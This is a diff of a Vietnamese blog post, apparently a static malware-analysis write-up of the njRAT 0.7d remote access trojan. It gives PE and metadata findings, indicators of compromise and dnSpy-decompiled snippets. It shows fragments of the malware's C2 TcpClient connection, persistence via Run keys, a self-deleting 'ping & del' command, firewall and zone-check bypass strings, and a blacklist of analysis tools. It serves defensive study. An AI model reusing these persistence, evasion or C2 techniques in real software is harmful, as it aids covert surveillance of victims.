@@ -1,338 +1,279 @@
 ---
-title: "Phân Tích Tĩnh Mã Độc Gián Điệp njRAT (0.7d): Từ Bóc Tách PE Header Đến Dịch Ngược Mã Nguồn .NET"
+title: "Vạch Trần njRAT 0.7d Qua Từng Dấu Vết Trong Mã Nguồn"
 date: 2026-10-21 21:00:00 +0700
 categories: [Malware Analysis, Reverse Engineering]
-tags: [malware, njrat, reverse-engineering, static-analysis, pestudio, floss, dnspy, dotnet]
-description: "Phân tích chuyên sâu mã độc gián điệp njRAT 0.7d bằng phương pháp phân tích tĩnh cơ bản và nâng cao: bóc tách PE Header, trích xuất cấu hình C2 bằng FLOSS và dịch ngược mã nguồn với dnSpy."
+tags: [malware, njrat, reverse-engineering, static-analysis, pestudio, detect-it-easy, dnspy, dotnet]
+description: "Khảo sát chi tiết mã độc gián điệp njRAT 0.7d (malware_blt.exe) bằng phân tích tĩnh: từ bóc tách PE header, metadata đến dịch ngược logic keylogger, chụp màn hình, persistence và kết nối C2 bằng dnSpy."
 image:
-  path: /assets/images/posts/malware/image16.png
-  alt: "Kết quả quét VirusTotal mẫu mã độc njRAT 0.7d"
+  path: /assets/images/posts/malware/nhan-dien.png
+  alt: "Vạch trần njRAT 0.7d qua từng dấu vết trong mã nguồn"
 toc: true
 comments: true
 mermaid: true
 ---
 
-> **Mục tiêu nghiên cứu:** Khảo sát toàn diện cấu trúc nội bộ, cơ chế lẩn tránh, module gián điệp và cấu hình Command & Control (C2) của biến thể mã độc **njRAT 0.7d** hoàn toàn bằng **phương pháp phân tích tĩnh (Static Analysis)** mà không cần thực thi trực tiếp mẫu vật.  
-> **Bộ công cụ sử dụng:** PeStudio · Detect It Easy / ExeinfoPE · FLOSS (FireEye Labs Obfuscated String Solver) · dnSpy (.NET Decompiler).
+> **Phân tích tĩnh nâng cao trên biến thể njRAT 0.7d (`malware_blt.exe`)**  
+> **Mục tiêu:** Vạch trần toàn diện cấu trúc nội bộ, cơ chế lẩn tránh, module gián điệp và cấu hình Command & Control (C2) hoàn toàn bằng **phương pháp phân tích tĩnh (Static Analysis)** mà không cần kích hoạt mẫu vật.  
+> **Bộ công cụ sử dụng:** Detect It Easy (DiE) · PeStudio · dnSpy (.NET Decompiler) · VMware Workstation (Isolated Host-Only Network).
+
+Một file thực thi chỉ khoảng **32 KB** có thể làm được những gì? Với mẫu `malware_blt.exe` này, câu trả lời dần hiện ra khi mình mở từng lớp bên trong: đọc bàn phím, chụp màn hình, tự khởi động cùng Windows và kết nối về máy chủ điều khiển.
+
+Nhưng mình không muốn dừng ở việc thấy công cụ an ninh gắn nhãn njRAT rồi chấp nhận kết luận đó. Điều mình muốn biết là **những chức năng ấy nằm ở đâu trong file, đoạn mã nào trực tiếp thực hiện chúng và các dấu vết kỹ thuật có liên kết logic với nhau hay không**.
+
+Mình bắt đầu từ việc giải phẫu cấu trúc file PE, lần qua những chuỗi và API đáng ngờ, sau đó dùng dnSpy để dịch ngược và kiểm tra mã nguồn. Toàn bộ quá trình dưới đây là phân tích tĩnh trong môi trường máy ảo cô lập có thiết lập Clean Snapshot; do đó những gì được xác nhận ở đây là chức năng có sẵn trong mã, chưa phải hành vi khi chạy thực tế.
+
+![Thiết lập Clean Snapshot trên máy ảo trước khi phân tích](/assets/images/posts/malware/snapshot.png)
+_Hình 1 — Thiết lập snapshot sạch (Clean Snapshot) trên VMware Workstation để sẵn sàng hoàn tác môi trường phân tích bất cứ lúc nào._
 
 ---
 
-## 1. Tổng quan về Mẫu Mã Độc và Môi Trường Phân Tích
+## 1. Nhận diện mẫu và tìm hướng phân tích
 
-### 1.1. Họ mã độc njRAT (Bladabindi)
-**njRAT** (còn được biết đến với tên gọi *Bladabindi*) là một trong những dòng Remote Access Trojan (RAT) phổ biến và nguy hiểm nhất kể từ năm 2012. Được viết trên nền tảng .NET Framework, njRAT cung cấp cho kẻ tấn công quyền kiểm soát toàn diện thiết bị nạn nhân từ xa: từ ghi lại thao tác phím (Keylogging), đánh cắp mật khẩu, chụp ảnh màn hình, quay lén webcam cho đến việc biến máy nạn nhân thành zombie để phát tán payload thứ cấp.
+Trước khi đi sâu vào từng hàm cụ thể, mình cần biết file được xây dựng trên nền tảng nào và mức độ tiếp cận phần mã bên trong tới đâu.
+
+### 1.1. Nhận diện PE32 và nền tảng VB.NET
+
+Sử dụng **Detect It Easy (DiE)** để kiểm tra định dạng tệp và chữ ký biên dịch:
+
+![Detect It Easy nhận diện định dạng PE32 và dấu hiệu VB.NET](/assets/images/posts/malware/nhan-dien.png)
+_Hình 2 — Detect It Easy nhận diện định dạng PE32 và dấu hiệu biên dịch bằng Microsoft Visual Basic .NET._
+
+Ở kết quả phân tích của Detect It Easy, mẫu được nhận diện là **PE32 (32-bit executable GUI)**, có dấu hiệu rõ ràng được viết bằng **VB.NET**. Chi tiết này giúp mình định hình hướng đi rất nhanh: đây là một ứng dụng chạy trên nền .NET CLR (Common Language Runtime). Vì vậy, thay vì phải dịch ngược mã máy x86 phức tạp bằng Disassembler, mình có thể dùng công cụ dịch ngược IL như **dnSpy** để tái tạo mã nguồn gần như nguyên bản.
+
+### 1.2. Kiểm tra section và dấu hiệu đóng gói
+
+Tiếp tục đánh giá cấu trúc các phân vùng PE và độ hỗn loạn dữ liệu (Entropy):
+
+![Các section và thông số entropy của mẫu](/assets/images/posts/malware/section-entropy.png)
+_Hình 3 — Các section và thông số entropy của mẫu phân tích._
+
+Phân tích section chưa cho thấy dấu hiệu đóng gói (packer) hay mã hóa phức tạp:
+- Các section đều có entropy dưới mức **6.0** (ngưỡng nén hoặc mã hóa thường trên 7.0).
+- DiE không phát hiện bất kỳ packer phổ biến nào (như UPX, Themida, VMProtect).
+
+Điều này cho thấy mã chương trình và tài nguyên nằm ở dạng nguyên bản, giúp việc tiếp cận metadata và các chuỗi text trong file thuận lợi hơn rất nhiều.
+
+### 1.3. Lần ra tên module gốc trong metadata
+
+Mở mẫu vật trong **PeStudio** để soi các trường siêu dữ liệu nội bộ:
+
+![PeStudio hiển thị metadata cùng tên module Stub.exe](/assets/images/posts/malware/pe-metadata.png)
+_Hình 4 — PeStudio hiển thị metadata cùng tên module gốc Stub.exe._
+
+Một chi tiết quan trọng xuất hiện ở đây là tên module gốc: **`Stub.exe`**. File mình đang phân tích có tên là `malware_blt.exe`, nhưng trường `Original Filename` trong PE metadata vẫn giữ tên `Stub.exe`. Dấu vết này cho thấy file đã được đổi tên sau khi biên dịch từ một trình tạo mã độc (Malware Builder) dạng Client-Stub.
+
+Kết quả quét VirusTotal ghi nhận trong tài liệu phân tích là **58/71** engine bảo mật đánh dấu mẫu độc hại với các định danh như `Trojan.njRAT`, `Backdoor.Bladabindi`. Con số ấy củng cố hướng điều tra, còn để hiểu cơ chế hoạt động thực sự, mình phải đi sâu vào mã nguồn.
+
+---
+
+## 2. Gom những đầu mối đầu tiên
+
+### 2.1. API bàn phím gợi mở nghi vấn keylogger
+
+Kiểm tra danh sách hàm Import trong PeStudio:
+
+![Nhóm API liên quan bàn phím và cửa sổ trong PeStudio](/assets/images/posts/malware/api-ban-phim.png)
+_Hình 5 — Nhóm API liên quan đến bàn phím và cửa sổ xuất hiện trong PeStudio._
+
+Trong PeStudio, nhóm hàm Win32 API liên quan đến bàn phím và trạng thái cửa sổ nổi lên rất rõ rệt:
+- `GetAsyncKeyState`: Thăm dò trạng thái vật lý của từng phím bấm.
+- `GetKeyboardState`: Lấy trạng thái của toàn bộ 256 phím ảo.
+- `GetForegroundWindow`: Lấy handle của cửa sổ đang kích hoạt (active window).
+
+Đứng riêng lẻ, những API này vẫn có thể xuất hiện trong các phần mềm tiện ích hợp pháp. Nhưng khi xuất hiện đồng thời trong một file 32 KB, chúng mở ra một giả thuyết kỹ thuật rõ ràng: **chương trình có khả năng ghi lại thao tác phím (keylogger) và gắn kèm ngữ cảnh ứng dụng người dùng đang tương tác**.
+
+### 2.2. Trích xuất cấu hình mạng và dấu vết tự khởi động
+
+Sử dụng tính năng trích xuất chuỗi (Strings) để tìm các đầu mối cấu hình:
+
+![Các chuỗi trích xuất chứa IP, cổng, tên file và đường dẫn Registry](/assets/images/posts/malware/cau-hinh.png)
+_Hình 6 — Các chuỗi trích xuất chứa IP, cổng kết nối, tên file ngụy trang và đường dẫn Registry._
+
+Những chuỗi nổi bật bao gồm:
+- Địa chỉ IP: `172.20.0.20`
+- Cổng dịch vụ: `1177`
+- Tên tệp ngụy trang: `WindowsServices.exe`
+- Khóa Registry tự khởi động: `Software\Microsoft\Windows\CurrentVersion\Run`
+
+IP và cổng chỉ ra địa chỉ máy chủ C2 mà mã độc sẽ hướng về. Tên `WindowsServices.exe` tạo cảm giác giống một tiến trình hệ thống để đánh lừa người dùng. Đường dẫn khóa `Run` là cơ chế bám trụ kinh điển trên hệ điều hành Windows.
+
+> **Lưu ý về môi trường thử nghiệm:** Địa chỉ `172.20.0.20` là IP nội bộ thuộc dải mạng Host-only cô lập (`VMnet0 Custom 172.20.0.0/24`) của phòng lab, không phải IP công khai trên Internet.
+
+![Cấu hình mạng Host-only cách ly VMnet0 phục vụ lab phân tích mã độc](/assets/images/posts/malware/lab.png)
+_Hình 7 — Mạng ảo nội bộ VMnet0 (172.20.0.0/24) trên VMware Virtual Network Editor giúp cô lập lưu lượng của mẫu vật an toàn._
+
+---
+
+## 3. Dịch ngược cơ chế khởi tạo và bám trụ
+
+Từ những từ khóa và đầu mối thu thập được ở bước phân tích cơ bản, mình đưa file vào **dnSpy** để phân tích luồng thực thi trong mã nguồn VB.NET.
+
+### 3.1. Theo luồng khởi tạo và kiểm tra Mutex
+
+Hàm `main()` của chương trình rất ngắn gọn, chỉ làm nhiệm vụ khởi tạo rồi chuyển giao luồng xử lý chính sang `OK.ko()`. 
+
+![Đoạn mã tạo Mutex và kiểm tra instance đang chạy](/assets/images/posts/malware/mutex.png)
+_Hình 8 — Đoạn mã khởi tạo Mutex và kiểm tra instance đang chạy trong dnSpy._
+
+Trong hàm khởi tạo, chương trình tạo một đối tượng **Mutex** với tên lấy từ biến cấu hình `OK.RG`:
+```visualbasic
+OK.mtx = New Mutex(False, OK.RG, flag)
+If Not flag Then
+    ProjectData.EndApp()
+End If
+```
+Nếu `flag` trả về `False` (tức Mutex đã tồn tại do một tiến trình njRAT khác đang chạy trên máy), chương trình sẽ gọi ngay `ProjectData.EndApp()` để tự kết thúc.
+
+Cơ chế này giúp mã độc tránh việc chạy đè nhiều bản sao trên cùng một máy nạn nhân, giảm thiểu nguy cơ bị người quản trị phát hiện do chiếm dụng tài nguyên bất thường.
+
+### 3.2. Đối chiếu Registry Run và thư mục Startup
+
+Tìm kiếm chuỗi `Software\Microsoft\Windows\CurrentVersion\Run` trong dnSpy dẫn thẳng tới hàm cài đặt **`INS()`**:
+
+![Đối chiếu chuỗi Registry Run với biến cấu hình và hàm INS](/assets/images/posts/malware/registry-run.png)
+_Hình 9 — Đối chiếu chuỗi Registry Run với biến cấu hình và hàm cài đặt bám trụ INS()._
+
+Đoạn mã trong hàm `INS()` xác nhận logic bám trụ (Persistence) rất bài bản:
+1. Sao chép file thực thi hiện tại vào thư mục người dùng dưới tên ngụy trang `WindowsServices.exe`.
+2. Ghi một giá trị vào Registry tại khóa `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`.
+3. Nếu có quyền quản trị, mã độc tiếp tục ghi thêm vào nhánh `HKEY_LOCAL_MACHINE`.
+4. Ngoài ra còn sao chép shortcut vào thư mục `Startup` của Windows Menu.
+
+Nhờ những điểm kích hoạt này, mỗi khi người dùng đăng nhập vào hệ thống, Windows sẽ tự động nạp `WindowsServices.exe` chạy ngầm.
+
+---
+
+## 4. Làm rõ khả năng giám sát người dùng
+
+### 4.1. Theo dõi phím bấm và cửa sổ đang hoạt động
+
+Quay lại nhóm API bàn phím đã phát hiện trong PeStudio, mình lần theo các điểm gọi trong dnSpy và tìm thấy hàm **`WRK()`**:
+
+![Hàm WRK đọc trạng thái phím và nối dữ liệu vào Logs](/assets/images/posts/malware/keylogger.png)
+_Hình 10 — Hàm WRK() quét mã phím qua GetAsyncKeyState và định dạng lưu vào biến Logs._
+
+Ở đây, toàn bộ logic của keylogger được phơi bày rõ ràng:
+- Một vòng lặp vô tận quét qua các mã phím ảo (từ 0 đến 255) bằng `GetAsyncKeyState`.
+- Khi phát hiện phím được nhấn, mã độc kiểm tra trạng thái Shift, CapsLock để chuyển thành ký tự hoa/thường chuẩn xác.
+- Gọi hàm **`AV()`** để lấy tiêu đề cửa sổ đang làm việc hiện tại (`GetForegroundWindow` + `GetWindowText`).
+- Nếu người dùng chuyển sang cửa sổ mới, mã độc sẽ chèn một dòng tiêu đề định dạng:  
+  `[dd/MM/yyyy HH:mm:ss Title]`  
+  rồi nối toàn bộ phím gõ phía sau vào chuỗi đệm **`Logs`**.
 
 ```mermaid
 flowchart TD
-    subgraph ATK[Attacker C2 Server - 172.20.0.20:1177]
-        C2_GUI[njRAT Builder / Controller GUI]
-    end
-
-    subgraph VICTIM[Nạn Nhân - Windows 10]
-        MAL[malware.exe - njRAT 0.7d]
-        MUTEX[Mutex: 406d3456... - Chống xung đột]
-        ANTI[Anti-Analysis & WMI Query Antivirus]
-        PERSIST[Persistence: Registry Run + SEE_MASK]
-        BSOD[Anti-Kill: NtSetInformationProcess BSOD]
-        KEYLOG[Module WRK: Keylogger + Active Window]
-        SPREAD[USB Spread: Tools.exe]
-    end
-
-    C2_GUI <-->|TCP Socket :1177| MAL
-    MAL --> MUTEX
-    MAL --> ANTI
-    MAL --> PERSIST
-    MAL --> BSOD
-    MAL --> KEYLOG
-    MAL --> SPREAD
+    A[Bắt đầu vòng lặp WRK] --> B[Gọi GetAsyncKeyState mã 0..255]
+    B --> C{Có phím được nhấn?}
+    C -- Không --> B
+    C -- Có --> D[Gọi AV lấy Active Window Title]
+    D --> E{Cửa sổ có đổi so với lần trước?}
+    E -- Có --> F["Ghi header: [Thời gian - Tên Cửa Sổ]"]
+    E -- Không --> G[Dịch mã phím sang ký tự]
+    F --> G
+    G --> H[Nối chuỗi vào biến bộ đệm Logs]
+    H --> B
 ```
 
-### 1.2. Thông tin nhận dạng mẫu phân tích (IoC sơ bộ)
-Mẫu phân tích được trích xuất từ kho lưu trữ mã nguồn mở uy tín ([theZoo repository](https://github.com/ytisf/theZoo/tree/master/malware/Source/Original/NjRAT_0.7d)):
+Nhờ gắn kèm tiêu đề cửa sổ, kẻ tấn công dễ dàng phân loại được đâu là tài khoản nhập trên trình duyệt web, đâu là tin nhắn chat hay câu lệnh trong terminal.
 
-| Thuộc tính | Giá trị nhận dạng |
+### 4.2. Chụp màn hình và kiểm tra ảnh trùng lặp
+
+Tiếp tục rà soát các hàm đồ họa trong mã nguồn, mình phát hiện cơ chế chụp màn hình trong lớp điều khiển:
+
+![Các đoạn mã xử lý ảnh chụp màn hình và so sánh MD5](/assets/images/posts/malware/chup-man-hinh.png)
+_Hình 11 — Logic chụp màn hình bằng CopyFromScreen, nén JPEG và tối ưu bằng băm MD5._
+
+Đoạn mã chụp màn hình sử dụng các lớp chuẩn của .NET Framework:
+- Tạo một đối tượng `Bitmap` với kích thước tương ứng độ phân giải màn hình (`Screen.PrimaryScreen.Bounds`).
+- Dùng `Graphics.CopyFromScreen()` để sao chép toàn bộ pixel hiển thị trên màn hình máy tính.
+- Nén hình ảnh thành định dạng **JPEG** để tiết kiệm băng thông.
+
+Đặc biệt, mã độc tính toán **mã băm MD5** của ảnh vừa chụp và so sánh với MD5 của bức ảnh trước đó:
+```visualbasic
+Dim hash As String = OK.GetHash(stream.ToArray())
+If hash = OK.lastScreenHash Then
+    ' Không gửi nếu nội dung màn hình không có gì thay đổi
+    Return
+End If
+OK.lastScreenHash = hash
+```
+Nếu màn hình tĩnh (người dùng không thao tác gì), mã độc sẽ bỏ qua không gửi dữ liệu. Đây là kỹ thuật tối ưu băng thông mạng giúp kết nối ngầm khó bị phát hiện bởi các công cụ giám sát lưu lượng.
+
+---
+
+## 5. Lần theo kênh điều khiển từ xa (C2)
+
+### 5.1. Nối cấu hình host và port với mã kết nối TCP
+
+Các chuỗi `172.20.0.20` và `1177` được tham chiếu trực tiếp tại nhánh khởi tạo kết nối mạng:
+
+![Nhánh kết nối sử dụng TcpClient cùng các biến OK.H và OK.P](/assets/images/posts/malware/ket-noi-c2.png)
+_Hình 12 — Nhánh kết nối socket sử dụng TcpClient cùng cấu hình OK.H và OK.P._
+
+Hàm mạng khởi tạo một đối tượng `System.Net.Sockets.TcpClient` và gọi phương thức kết nối:
+```visualbasic
+OK.C = New TcpClient()
+OK.C.Connect(OK.H, Conversions.ToInteger(OK.P))
+```
+Trong đó, `OK.H = "172.20.0.20"` và `OK.P = "1177"`. 
+
+Sau khi kết nối TCP thành công, mã độc gửi gói tin "bắt tay" (handshake) chứa thông tin ban đầu của nạn nhân lên C2 Server: Tên máy (`PC`), Tên người dùng (`User`), Hệ điều hành, Phiên bản RAT (`0.7d`) và biểu tượng cờ quốc gia.
+
+### 5.2. Phân tích nhánh tải và thực thi file
+
+Bên cạnh việc truyền dữ liệu đánh cắp về server, njRAT còn có một bộ lắng nghe và thực thi lệnh từ xa. Trong đó nhánh tải và chạy file thứ cấp thể hiện rõ năng lực mở rộng:
+
+![Chuỗi thao tác tải dữ liệu, ghi file tạm và khởi chạy](/assets/images/posts/malware/tai-va-chay-file.png)
+_Hình 13 — Nhánh xử lý lệnh tải payload từ URL, lưu file tạm và khởi chạy qua Process.Start._
+
+Khi nhận được lệnh tương ứng từ C2, mã độc thực thi chuỗi hành động sau:
+1. Dùng `WebClient.DownloadData(url)` để tải tệp thực thi từ đường link do kẻ tấn công chỉ định.
+2. Tạo đường dẫn file tạm trong thư mục `%TEMP%` bằng `Path.GetTempFileName()`.
+3. Ghi dữ liệu nhị phân xuống ổ đĩa qua `File.WriteAllBytes()`.
+4. Gọi `Process.Start()` để kích hoạt tệp mới.
+
+Điều này chứng minh biến thể này không chỉ giới hạn ở khả năng do thám mà còn đóng vai trò là một **Trojan Downloader**, sẵn sàng thả thêm mã độc tống tiền (Ransomware) hoặc công cụ khai thác sâu hơn vào mạng nội bộ.
+
+---
+
+## 6. Ghép lại bức tranh hoạt động của njRAT
+
+### 6.1. Dấu vết kiểm tra Antivirus và gỡ bỏ cài đặt
+
+Trong các hàm hỗ trợ hệ thống, mình phát hiện thêm hai chi tiết đáng chú ý:
+
+1. **Thăm dò giải pháp phòng thủ**: Mã độc thực thi truy vấn WMI:
+   ```sql
+   Select * From AntiVirusProduct
+   ```
+   tới namespace `root\SecurityCenter` hoặc `root\SecurityCenter2` để lấy tên phần mềm diệt virus đang được cài đặt trên máy nạn nhân và gửi báo cáo về bảng điều khiển C2.
+
+2. **Chức năng tự hủy (Self-Uninstall)** trong hàm `UNS()`: Khi nhận lệnh gỡ bỏ, mã độc xóa khóa Registry tại mục Run, kết thúc tiến trình và gọi script xóa chính file thực thi để xóa sạch dấu vết.
+
+### 6.2. Bảng tổng hợp IoC trích xuất từ mẫu vật
+
+Dưới đây là các chỉ số thỏa hiệp (Indicators of Compromise) đã được xác minh trực tiếp từ mã nguồn:
+
+| Thành phần | Chi tiết kỹ thuật |
 |---|---|
-| **Tên tệp ban đầu** | `malware.exe` / `Stub.exe` |
-| **Họ mã độc** | njRAT / Bladabindi (Phiên bản: `0.7d`) |
-| **Định dạng tệp** | PE32 executable (GUI) Intel 80386, Mono/.Net assembly |
-| **Dung lượng tệp** | `32.768 bytes` (~32 KB) |
-| **Mã băm MD5** | `c35fdeebdede1d3a555e05209e61bb73` |
-| **Mã băm SHA256** | `d1b368392d8143ba7038493570f34c994018cc46855918e3022085de32f6b653` |
-| **Compiler / Ngôn ngữ** | Microsoft Visual Basic .NET / Framework v2.0.50727 |
-| **Chỉ số Entropy** | `5.617` (Khẳng định tệp nguyên bản, không bị packed/obfuscated) |
-
-> [!CAUTION]
-> Phân tích mã độc tĩnh dù không thực thi tệp vẫn phải được tiến hành trong máy ảo chuyên dụng (FlareVM / Windows Sandbox) được cô lập mạng hoàn toàn để tránh thao tác nhầm lẫn.
-
----
-
-## 2. Phân Tích Tĩnh Cơ Bản (Basic Static Analysis)
-
-Phân tích tĩnh cơ bản là bước đầu tiên nhằm thu thập các siêu dữ liệu (metadata), đặc tính phân vùng PE, các hàm API hệ thống được import và các chuỗi ký tự mà không cần chạy chương trình.
-
-### 2.1. Đánh giá ban đầu và Quét VirusTotal
-
-Sử dụng PeStudio để trích xuất nhanh thông số tổng quan của tệp thực thi:
-
-![Tổng quan đặc tính và đánh giá ban đầu](/assets/images/posts/malware/image15.png)
-*Hình 1 — PeStudio tổng quan các đặc tính và đánh giá rủi ro ban đầu của tệp.*
-
-Mẫu mã độc là một tệp thực thi 32-bit dạng GUI được biên dịch bằng C#/.NET. Các thuộc tính nội bộ như tên module `Stub.exe` và manifest mặc định cho thấy đây là một payload sinh ra trực tiếp từ Malware Builder mà chưa qua bước mã hóa tinh vi (crypter/packer).
-
-![Kết quả quét VirusTotal và phân loại mã độc](/assets/images/posts/malware/image16.png)
-*Hình 2 — Kết quả kiểm tra mức độ độc hại trên VirusTotal.*
-
-Kết quả quét trên VirusTotal cho thấy tỷ lệ cảnh báo độc hại áp đảo: **58/71** giải pháp an ninh đánh dấu tệp là mã độc. Các nhãn phát hiện phổ biến gồm `Trojan.njRAT`, `Backdoor.Bladabindi`, `MSIL/TrojanDownloader`, xác nhận chính xác bản chất trojan điều khiển từ xa.
-
-### 2.2. Ánh xạ năng lực qua khung MITRE ATT&CK
-
-![Ánh xạ hành vi theo khung MITRE ATT&CK](/assets/images/posts/malware/image17.png)
-*Hình 3 — Phân tích hành vi tĩnh được ánh xạ theo các kỹ thuật trong ma trận MITRE ATT&CK.*
-
-Dựa trên các chỉ báo từ PeStudio, mã độc thể hiện một phổ năng lực bao phủ nhiều giai đoạn tấn công:
-- **Defense Evasion (Lẩn tránh phòng thủ)**: Thăm dò Antivirus, can thiệp Registry, che giấu tiến trình.
-- **Credential Access & Collection (Thu thập dữ liệu)**: Giám sát phím gõ (Keylogging), chụp màn hình, truy cập webcam.
-- **Command and Control (Giao tiếp máy chủ điều khiển)**: Tạo kết nối socket gửi dữ liệu và nhận lệnh thực thi.
-
-### 2.3. Bóc tách PE Sections và Entropy
-
-![Phân tích Entropy và cấu trúc Sections](/assets/images/posts/malware/image19.png)
-*Hình 4 — Chỉ số Entropy và kích thước các phân vùng PE của mẫu vật.*
-
-Dữ liệu phân tích cấu trúc phân vùng (`sections`) chứng minh tệp **không bị đóng gói (unpacked)**:
-- Mức entropy của phân vùng `.text` và `.rsrc` đều dưới **7.0** (entropy tổng là 5.617).
-- Kích thước vật lý trên đĩa (`raw-size`) và kích thước trên bộ nhớ (`virtual-size`) tương đương nhau.
-- Chỉ duy nhất phân vùng `.text` có quyền thực thi (`Execute`). Điều này giải thích tại sao các công cụ tĩnh có thể trích xuất trực tiếp gần như toàn bộ chuỗi ký tự và hàm API.
-
-### 2.4. Danh sách thư viện và Bảng Import Address Table (IAT)
-
-![Phân tích danh sách thư viện tĩnh](/assets/images/posts/malware/image20.png)
-*Hình 5 — Danh sách các thư viện hệ thống liên kết với mẫu.*
-
-Bảng thư viện cho thấy hai dấu hiệu kỹ thuật nổi bật:
-1. `mscoree.dll`: Thư viện lõi nạp môi trường thực thi .NET (CLR Loader).
-2. `avicap32.dll`: Được gọi thông qua kỹ thuật **P/Invoke**. Thư viện này quản lý các thiết bị quay video (webcam), hé lộ khả năng gián điệp hình ảnh trực tiếp.
-
-![Phân tích bảng Import Address Table (IAT)](/assets/images/posts/malware/image21.png)
-*Hình 6 — Các hàm API cảnh báo đỏ trong bảng Import Address Table (IAT).*
-
-PeStudio cắm cờ đỏ hàng loạt hàm API nhạy cảm:
-- **Nhóm Keylogger & Theo dõi người dùng**: `GetAsyncKeyState`, `GetKeyboardState`, `GetForegroundWindow`, `MapVirtualKey`.
-- **Nhóm Đa phương tiện**: `capGetDriverDescriptionA` (thăm dò phần cứng webcam).
-- **Nhóm Mạng & Tải mã độc**: `connect`, `Send`, `DownloadData`, `WriteAllBytes`.
-- **Nhóm Can thiệp hệ điều hành**: `NtSetInformationProcess`, `SetEnvironmentVariable`.
-
-### 2.5. Cấu trúc Metadata .NET và Chuỗi tĩnh (Strings)
-
-![Phân tích cấu trúc module .NET](/assets/images/posts/malware/image22.png)
-*Hình 7 — Metadata .NET Framework và các namespace sử dụng.*
-
-Tên module nội bộ là `Stub.exe` thuộc namespace `Stub`. Ứng dụng nhắm mục tiêu .NET Framework cổ điển `v2.0.50727` nhằm tối đa hóa khả năng tương thích ngược trên hầu hết các máy Windows từ Windows 7 đến Windows 11 mà không cần cài thêm runtime mới. Các namespace được nạp gồm `System.Net`, `System.Drawing.Imaging`, `System.Security.Cryptography`, và `System.IO.Compression`.
-
-![Phân tích chuỗi tĩnh](/assets/images/posts/malware/image23.png)
-*Hình 8 — Trích xuất các chuỗi ký tự tĩnh nghi vấn từ PeStudio.*
-
-Trích xuất chuỗi tĩnh phát hiện:
-- Địa chỉ IP khả nghi: `172.20.0.20`.
-- Truy vấn WMI Unicode: `Select * From AntiVirusProduct` — một kỹ thuật kinh điển giúp mã độc kiểm tra danh sách phần mềm diệt virus đang cài trên máy.
-
-![Kết quả quét định danh và cơ chế bảo vệ bằng ExeinfoPE](/assets/images/posts/malware/image24.png)
-*Hình 9 — ExeinfoPE nhận diện môi trường biên dịch VB.NET và cơ chế bảo vệ Anti-Decompiler.*
-
-Công cụ ExeinfoPE xác nhận compiler là **VB.NET**, định danh chính xác phiên bản **NjRAT (0.7D)**, đồng thời đưa ra cảnh báo: `Anti-dnSpy + Anti-ILSpy`. Mã độc đã tích hợp sẵn cơ chế bẫy lỗi nhằm ngăn cản các nhà phân tích sử dụng công cụ dịch ngược thông dụng.
-
----
-
-## 3. Phân Tích Tĩnh Nâng Cao (Advanced Static Analysis)
-
-Nếu như phân tích tĩnh cơ bản giúp xây dựng các "giả thuyết", thì phân tích tĩnh nâng cao bằng **FLOSS** và dịch ngược mã nguồn bằng **dnSpy** sẽ chứng minh chính xác **cách thức** mã độc hiện thực hóa từng chức năng.
-
-### 3.1. Trích xuất cấu hình C2 ẩn bằng FLOSS
-
-Sử dụng FLOSS để giải mã các chuỗi ký tự bị che giấu:
-
-![Sử dụng công cụ FLOSS để trích xuất chuỗi](/assets/images/posts/malware/image25.png)
-*Hình 10 — FLOSS bóc tách toàn bộ chuỗi ký tự giải mã.*
-
-![Trích xuất chuỗi cấu hình C2 và định danh chiến dịch](/assets/images/posts/malware/image26.png)
-*Hình 11 — Tham số C2 cốt lõi được làm sáng tỏ.*
-
-Kết quả FLOSS đã giải mã thành công toàn bộ thông số cấu hình cốt lõi của chiến dịch:
-- **C2 IP & Port**: `172.20.0.20:1177` (cổng 1177 là cổng mặc định khét tiếng của njRAT).
-- **Campaign ID (Khóa chiến dịch)**: `Y262SUCZ4UJJ`.
-- **Victim ID**: Chuỗi Base64 `dmljdGltXzAx` giải mã thành `victim_01`.
-- **Khóa Mutex**: `406d3456f0ada99f8c6ea81e98985830` — dùng để ngăn ngừa việc khởi chạy trùng lặp nhiều tiến trình trên cùng một máy nạn nhân.
-
-![Chuỗi kỹ thuật bám trụ và thao túng môi trường hệ thống](/assets/images/posts/malware/image27.png)
-*Hình 12 — Chuỗi lệnh liên quan đến duy trì quyền truy cập (Persistence).*
-
-![Các chuỗi lệnh thao túng Registry, biến môi trường và cơ chế tự xóa](/assets/images/posts/malware/image28.png)
-*Hình 13 — Chuỗi lệnh can thiệp Firewall, tắt cảnh báo vùng và tự hủy.*
-
-Các chuỗi kỹ thuật hệ thống hé lộ:
-- **Khóa Registry Run**: Ghi vào `Software\Microsoft\Windows\CurrentVersion\Run` dưới tên ngụy trang `server.exe`.
-- **Tắt cảnh báo tải về**: Đặt biến môi trường `SEE_MASK_NOZONECHECKS = 1` để Windows không hiện popup cảnh báo bảo mật khi mở tệp tải về từ Internet.
-- **Vượt tường lửa**: Lệnh `netsh firewall add/delete allowedprogram`.
-- **Cơ chế tự xóa (Self-deletion)**: Chuỗi lệnh `cmd.exe /c ping 0 -n 2 & del` để tự hủy file gốc sau khi đã thả payload vào hệ thống.
-
-![Danh sách chuỗi thăm dò Antivirus và né tránh công cụ phân tích](/assets/images/posts/malware/image29.png)
-*Hình 14 — Danh sách đen các công cụ phân tích và phần mềm diệt virus bị theo dõi.*
-
-FLOSS làm rõ danh sách "blacklist" mà njRAT liên tục rà soát:
-- Tiến trình máy ảo: `VBoxService`, `VGAuthService`.
-- Công cụ điều tra / gỡ lỗi: `procexp`, `processhacker`, `dnSpy`, `ILSpy`, `exeinfoPE`.
-- Công cụ bắt gói mạng: `wireshark`, `apateDNS`, `Sandboxie Control`.
-
-![Chuỗi thông báo trạng thái trả về máy chủ](/assets/images/posts/malware/image30.png)
-*Hình 15 — Cấu trúc các thông điệp trạng thái gửi về C2 Server.*
-
----
-
-### 3.2. Dịch ngược mã nguồn và Bóc tách logic với dnSpy
-
-Do tệp được biên dịch dưới dạng mã trung gian MSIL (.NET), ta sử dụng **dnSpy** để tái tạo trực tiếp mã nguồn Visual Basic/C# tương đương.
-
-#### A. Điểm nhập (Entry Point) và Khởi tạo Mutex
-
-![Điểm vào chương trình Entry Point](/assets/images/posts/malware/image31.png)
-*Hình 16 — Hàm Main() trong lớp A chuyển tiếp luồng thực thi sang OK.ko().*
-
-Hàm `Main()` chỉ đóng vai trò là một lớp vỏ bọc mỏng (wrapper), lập tức chuyển toàn bộ quyền điều khiển sang hàm `OK.ko()`.
-
-![Kiểm tra tiến trình duy nhất Mutex](/assets/images/posts/malware/image32.png)
